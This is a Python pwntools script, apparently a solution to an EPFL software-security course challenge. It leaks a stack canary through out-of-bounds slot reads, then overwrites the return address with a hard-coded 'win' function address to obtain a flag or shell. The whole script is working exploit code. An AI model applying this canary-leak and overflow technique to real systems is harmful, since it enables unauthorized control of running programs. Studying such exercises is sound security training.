from pwn import *

HOST = "cs412.epfl.ch"
PORT = 9002

conn = remote(HOST, PORT)
canary = b""
conn.recvuntil(b"Oof looks like this will be a bit more trouble...")


for i in range(12, 14):
    # 发送读取命令
    conn.sendlineafter(b"Your command: ", b"0")  # 选择读取操作
    conn.sendlineafter(b"Tell me which slot you wanna read: ", str(i).encode())  # 读取第i个slot

    # 接收返回的数据
    data = conn.recv(8)
    canary += data

    # 打印当前泄露的Canary部分
    print(f"Leaked byte {i}: {data}")

# 打印完整的Canary
print(f"Leaked Canary: {canary.hex()}")

win_addr = 0x00401236
payload = b"A" * 96 + canary + p64(win_addr)+ p64(win_addr)+ p64(win_addr)+ p64(win_addr)+ p64(win_addr)+ p64(win_addr)+ p64(win_addr) #+ p64(bin_sh_addr)

conn.sendlineafter(b"Your command: ", b"1")
conn.sendlineafter(b"Tell me how much you wanna write: ", str(len(payload)).encode())
conn.sendlineafter(b"What are the contents (max 8 bytes): ", payload)

# 触发返回地址
conn.sendlineafter(b"Your command: ", b"2")
# 接收程序的输出（例如 flag 或 shell）
conn.interactive()

# 关闭连接
conn.close()